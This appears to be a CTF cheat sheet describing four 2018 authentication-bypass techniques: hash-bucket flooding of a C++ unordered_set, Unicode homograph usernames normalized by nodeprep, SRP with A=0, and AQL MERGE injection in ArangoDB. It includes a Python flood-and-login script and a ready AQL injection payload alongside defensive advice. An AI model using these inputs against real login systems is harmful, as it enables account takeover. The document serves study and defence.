## std::unordered_set Bucket Collision Auth Bypass (Hackover 2018)

**Pattern:** A C++ backend stores credential hashes in `std::unordered_set<std::string>`. The set's bucket index is derived from only the first bytes of a SHA-512 digest (truncated `size_t` hash). The lookup loop aborts early after a bounded number of bucket probes (`MAX_LOOKUPS = 1000`). Flood the set with 1000+ entries that all collide in the same bucket as the `root` account — the compare for the correct entry never executes and the call returns "found" on an attacker-chosen password.

```cpp
// Vulnerable shape
std::unordered_set<std::string> users;
auto it = users.find(login_key);           // probes at most MAX_LOOKUPS
if (it != users.end()) { /* accepted */ }
```

```python
# Flood registration: every entry collides in root's bucket
import requests
for i in range(1100):
    requests.post("http://target/register",
                  data={"name": f"ro{i:04d}", "password": "ot1"})
# Log in as root with an arbitrary password — loop gives up before compare
requests.post("http://target/login", data={"name": "root", "password": "anything"})
```

**Key insight:** Hash-table implementations that truncate digests into bucket indices expose a second-preimage surface: the attacker only has to match the bucket, not the full hash. When the data structure also has a bounded probe count (DoS guard), flooding the bucket turns an authentication check into an unconditional accept. Any `unordered_map`/`unordered_set` keyed on low-entropy derivations of user input is suspect — watch for `std::hash<std::string>` implementations that reduce to `size_t` via XOR-folding.

## nodeprep.prepare Homograph Username Collision (HCTF 2018)

**Pattern:** Registration calls Node's `node-xmpp-server` `nodeprep.prepare(username)` which runs RFC-3491/Stringprep normalization. Unicode characters like `ᴬ` (U+1D2C Modifier Letter Capital A) normalize to ASCII `A`, then the existing user lookup finds the already-registered `admin`. Register `ᴬdmin` with any password, and the lookup returns the real admin row — set a new password via a password-reset flow.

```text
username: \u1D2Cdmin   # ᴬdmin
nodeprep.prepare("ᴬdmin") == "admin"
```

**Key insight:** Any pipeline that (1) normalizes usernames before lookup but (2) stores the pre-normalized form separately is vulnerable. Normalize once at write-time and never accept users whose pre-normalized form collides with an existing row. Libraries to audit: `nodeprep`, `icu.normalize`, `unicodedata.normalize`, `golang.org/x/text/secure/precis`.

## SRP A=0, A=N Auth Bypass (OTW Advent 2018)

**Pattern:** SRP (Secure Remote Password) implementations that do not validate `A % N != 0` allow the client to send `A = 0` (or `A = k*N`). The server computes `S = (A * v^u)^b mod N = 0`, so the session key is `H(0)` — known to the attacker. Bypass login without knowing the password.

```text
Client: sends A = 0
Server: computes S = 0
Session key: K = H(0)   # attacker knows this
```

**Key insight:** SRP, DH, and similar group-based protocols need explicit validation that public values are nontrivial. Spec-compliant SRP rejects `A % N == 0`; buggy implementations don't. Same attack works for `A = N, 2N, ...`.

## ArangoDB AQL MERGE Injection for Privilege Escalation (P.W.N. CTF 2018)

**Pattern:** ArangoDB's AQL query language accepts user-supplied fragments that are concatenated into `FILTER` clauses. Inject `' || 1 == 1 LET newitem = MERGE(u, {'role':'admin'}) RETURN newitem //` to turn a login check into an in-memory role upgrade — the server returns the modified user object without touching the real record.

```text
username: x' || 1 == 1 LET newitem = MERGE(u, {'role':'admin'}) RETURN newitem //
password: anything
```

**Key insight:** NoSQL databases each have their own injection grammar. AQL's `MERGE` creates a new document inheriting the found record's fields, bypassing any ACL that only checks persistent storage. Always use parameterised bind variables.
